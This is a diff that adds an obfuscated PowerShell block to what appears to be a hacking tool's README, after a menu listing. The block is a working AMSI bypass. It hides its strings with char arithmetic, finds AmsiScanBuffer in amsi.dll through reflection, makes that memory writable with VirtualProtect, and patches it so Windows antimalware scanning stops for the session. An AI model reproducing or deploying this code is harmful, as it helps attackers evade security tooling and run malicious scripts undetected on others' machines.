@@ -119,3 +119,69 @@ _".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')
 [+] menu
 [+] exit
 ```
+```powershell
+FUncTIon Get-PZ2zmpurexnDXVSxx {
+    Param ($ljOHgifgLteNDYGV, $HWN81YY7isiEXwOd)
+    $IObr8mVbBcalgmD = ([AppDomain]::CurrentDomain.GetAssemblies() |
+    WheRe-ObJecT { 
+        $_.GlobalAssemblyCache -And $_.Location.Split(""+[cHaR](6474-6382)+"")[-1].Equals(""+[cHAR](8862-8779)+[CHaR](9611-9490)+[chaR](4982-4867)+[chaR]([bYtE] 0xb6-0x42)+[cHar](1707-1606)+[chaR](7297-7188)+[CHAR](1332-1286)+[cHaR]([Byte] 0xba-0x56)+[Char](7772-7664)+[char](6965-6857)+"")
+     }).GetType("Microsoft."+[cHar]([BYTE] 0xae-0x57)+[cHaR](5622-5517)+[ChaR](8858-8748)+[chaR]([byTe] 0x56-0x23)+[chAR](1248-1198)+[ChaR](877-831)+[CHAR](4158-4073)+[ChaR](4512-4402)+"safeNativeMethods")
+    $IqnMnVucT=@()
+    $IObr8mVbBcalgmD.GetMethods() | FOrEaCH-ObJEct {
+        If($_.Name -LiKe "Ge*P*oc*"+[char](8884-8784)+[cHaR](6481-6381)+[cHAr](4918-4804)+[chAr]([bYTe] 0xc7-0x62)+[cHAR](859-744)+"s") {
+            $IqnMnVucT+=$_
+        }
+    }
+    return $IqnMnVucT[0].Invoke($null, @(($IObr8mVbBcalgmD.GetMethod(""+[char]([BYtE] 0x96-0x4f)+[ChaR]([BytE] 0xbb-0x56)+[cHar](5090-4974)+[CHar](7341-7264)+"odul"+[cHaR]([byte] 0xa8-0x43)+[ChAr](1345-1273)+[cHAR](1128-1031)+[cHAr](8032-7922)+"dle")).Invoke($null, @($ljOHgifgLteNDYGV)), $HWN81YY7isiEXwOd))
+}
+#jump
+
+FUncTIon Get-iy2kysa7yS {
+    Param (
+     [Parameter(Position = 0, Mandatory = $True)] [Type[]] $jqr21eiEq5PCPuo, [Parameter(Position = 1)] [Type] $zjYqpHs8RLAoDPo = [Void]
+    )
+    $WQvsFMfB0c = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
+        (New-Object SYSTEM.REFLECtiOn.AsSembLYNaME(""+[cHaR](3975-3893)+[chaR](6333-6232)+[cHAR](6160-6058)+"lec"+[chAR](9375-9259)+[Char](6379-6278)+[cHaR](340-240)+[CHAR](6723-6655)+[cHAr](5669-5568)+"legate")),
+        [SYsTEM.ReflEctIoN.EMit.ASSemBlYBuiLDERACCeSs]::Run
+    ).DEfINEDYnAMiCMODUle(
+        ""+[Char](5533-5460)+[cHAR]([byTE] 0xb1-0x43)+[chaR](5985-5908)+"emo"+[Char](467-353)+[cHAr]([BYTE] 0xd8-0x5f)+"Module",
+        $false
+    ).DefineType(
+        $(""+[ChAr]([ByTe] 0x82-0x35)+[CHaR](7019-6898)+[cHar](8273-8205)+[Char](5350-5249)+[ChAr](4707-4599)+[cHAr]([BytE] 0xca-0x65)+[ChaR](9729-9626)+[CHar](686-589)+[chAr]([BYtE] 0x9c-0x28)+[chaR](936-835)+[cHAr]([bYte] 0x89-0x35)+[cHaR](3845-3724)+[Char]([ByTE] 0xd9-0x69)+[chAr](7417-7316)+""),
+        "Class, Public, Sealed, AnsiClass, AutoClass",
+        [SyStem.MUlTicaSTDeLEgate]
+    )
+
+    $WQvsFMfB0c.DefiNeCONstRUcToR(
+        "RTSpecialName, HideBySig, Public",
+        [SYSTem.REfLectiON.CAlLINgCoNVeNtIOnS]::Standard, $jqr21eiEq5PCPuo
+    ).SetImplementationFlags("Runtime, Managed")
+
+    $WQvsFMfB0c.DeFINeMeTHod(
+        "Invoke",
+        "Public, HideBySig, NewSlot, Virtual",
+        $zjYqpHs8RLAoDPo,
+        $jqr21eiEq5PCPuo
+    ).SetImplementationFlags("Runtime, Managed")
+    
+    return $WQvsFMfB0c.CreateTYpe()
+}
+#jump
+[IntPtr]$jdemwXeK2wnWhB = Get-PZ2zmpurexnDXVSxx $(""+[char](2099-2002)+[ChAr](5453-5344)+[CHar]([bytE] 0xb5-0x42)+[Char]([Byte] 0xdf-0x76)+[chAr]([BYTE] 0x4d-0x1f)+[chAR](2502-2402)+[chAR](749-641)+[cHar]([BytE] 0x91-0x25)+"") $(""+[ChAr](3160-3095)+[cHaR]([BYtE] 0xdc-0x6f)+[cHar](6716-6601)+[chAR]([ByTe] 0xdf-0x76)+[Char](7170-7087)+[ChAr]([BYtE] 0xd5-0x72)+[cHAR](6847-6750)+[chaR](2526-2416)+[cHAr](3598-3532)+[char](7822-7705)+[ChAr](377-275)+[cHar](3259-3157)+[chaR](7660-7559)+[cHar](4473-4359)+"")
+#jump
+$N7IBEcG01XRRln = 0
+#jump
+$knBIRuLz=[SYsTem.RuNtiMe.INtErOpSeRvIcES.MArsHal]::GETDElEgaTEForFUNCtionPOiNTeR(
+    (Get-PZ2zmpurexnDXVSxx $(""+[ChAR](577-470)+[ChaR](2547-2446)+[cHar](5679-5565)+[chAr](6260-6150)+[cHAr](4851-4750)+[ChAr](3338-3230)+[char](9887-9836)+[Char]([bYTe] 0x77-0x45)+[CHAR](4271-4225)+[cHar](7885-7785)+[cHAR]([bytE] 0xdc-0x70)+[ChAR](1500-1392)+"") VirtualProtect), 
+    (Get-iy2kysa7yS @([IntPtr], [UInt32], [UInt32], [UInt32].MAkeBYREFTypE()) ([Bool]))
+)
+#jump
+$UQXThoSh2exMyo = $knBIRuLz.Invoke($jdemwXeK2wnWhB, 3, 0x40, [ref]$N7IBEcG01XRRln)
+#jump
+$hpBlHjUMs = [Byte[]] (0xb8,0x34,0x12,0x07,0x80,0x66,0xb8,0x32,0x00,0xb0,0x57,0xc3)
+#jump
+$UQXThoSh2exMyo = [SYsTem.RuNtiMe.INtErOpSeRvIcES.MArsHal]::Copy($hpBlHjUMs, 0, $jdemwXeK2wnWhB, 12)
+#jump
+Remove-Item Function:Get-iy2kysa7yS
+#jump
+```
